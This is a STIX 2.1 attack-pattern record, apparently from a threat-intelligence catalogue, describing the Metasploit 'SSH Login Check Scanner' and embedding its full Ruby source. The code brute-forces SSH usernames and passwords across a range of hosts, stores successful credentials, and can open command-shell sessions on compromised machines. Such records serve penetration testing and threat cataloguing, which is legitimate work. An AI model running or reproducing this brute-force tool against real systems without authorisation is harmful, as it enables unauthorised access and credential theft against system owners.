{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--98e2b6c3-639d-49df-a03c-96614ed5cd91",
    "created": "2024-08-14T16:27:26.884846Z",
    "modified": "2024-08-14T16:27:26.88485Z",
    "name": "SSH Login Check Scanner",
    "description": " This module will test ssh logins on a range of machines and report successful logins.  If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/ssh_login.rb",
            "external_id": "ssh_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\nrequire 'metasploit/framework/login_scanner/ssh'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::CommandShell\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::SSH::Options\n\n  def initialize\n    super(\n      'Name'           => 'SSH Login Check Scanner',\n      'Description'    => %q{\n        This module will test ssh logins on a range of machines and\n        report successful logins.  If you have loaded a database plugin\n        and connected to a database this module will record successful\n        logins and hosts so you can track your access.\n      },\n      'Author'         => ['todb'],\n      'References'     =>\n        [\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => {'VERBOSE' => false} # Disable annoying connect errors\n    )\n\n    register_options(\n      [\n        Opt::RPORT(22)\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        Opt::Proxies,\n        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30]),\n        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', true])\n      ]\n    )\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def session_setup(result, scanner)\n    return unless scanner.ssh_socket\n\n    platform = scanner.get_platform(result.proof)\n\n    # Create a new session\n    sess = Msf::Sessions::SshCommandShellBind.new(scanner.ssh_socket)\n\n    merge_me = {\n      'USERPASS_FILE' => nil,\n      'USER_FILE'     => nil,\n      'PASS_FILE'     => nil,\n      'USERNAME'      => result.credential.public,\n      'PASSWORD'      => result.credential.private\n    }\n    s = start_session(self, nil, merge_me, false, sess.rstream, sess)\n    self.sockets.delete(scanner.ssh_socket.transport.socket)\n\n    # Set the session platform\n    s.platform = platform\n\n    # Create database host information\n    host_info = {host: scanner.host}\n\n    unless s.platform == 'unknown'\n      host_info[:os_name] = s.platform\n    end\n\n    report_host(host_info)\n\n    s\n  end\n\n\n  def run_host(ip)\n    @ip = ip\n    print_brute :ip => ip, :msg => 'Starting bruteforce'\n\n    cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD'],\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::SSH.new(\n      host: ip,\n      port: rport,\n      cred_details: cred_collection,\n      proxies: datastore['Proxies'],\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n      connection_timeout: datastore['SSH_TIMEOUT'],\n      framework: framework,\n      framework_module: self,\n      skip_gather_proof: !datastore['GatherProof']\n    )\n\n    scanner.verbosity = :debug if datastore['SSH_DEBUG']\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\\r\\n\\e\\b\\a]/, ' ')}'\"\n        credential_data[:private_type] = :password\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        if datastore['CreateSession']\n          begin\n            session_setup(result, scanner)\n          rescue StandardError => e\n            elog('Failed to setup the session', error: e)\n            print_brute :level => :error, :ip => ip, :msg => \"Failed to setup the session - #{e.class} #{e.message}\"\n          end\n        end\n\n        if datastore['GatherProof'] && scanner.get_platform(result.proof) == 'unknown'\n          msg = \"While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with\"\n          msg << \" 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with\"\n          msg << \" device details so it can be handled in the future.\"\n          print_brute :level => :error, :ip => ip, :msg => msg\n        end\n        :next_user\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        vprint_brute :level => :verror, :ip => ip, :msg => \"Could not connect: #{result.proof}\"\n        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?\n        invalidate_login(credential_data)\n        :abort\n      when Metasploit::Model::Login::Status::INCORRECT\n        vprint_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n        invalidate_login(credential_data)\n        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?\n      else\n        invalidate_login(credential_data)\n        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?\n      end\n    end\n  end\nend\n"
}